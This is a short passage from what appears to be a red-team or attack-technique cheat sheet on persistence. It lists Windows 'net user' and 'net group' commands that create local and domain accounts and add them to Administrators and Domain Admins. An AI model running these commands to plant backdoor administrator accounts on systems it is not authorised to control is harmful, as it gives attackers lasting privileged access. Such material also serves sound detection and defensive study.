# Persistence
## Create account
### Local Account Admin
Adversaries may create a local account to maintain access to victim systems. Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

```
net user /add [*username] [password]
net localgroup administrators [username] /add
```
### Domain Account Admin
Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. 
```
net user username password /ADD /DOMAIN 
net group "Domain Admins" username /add /domain
```
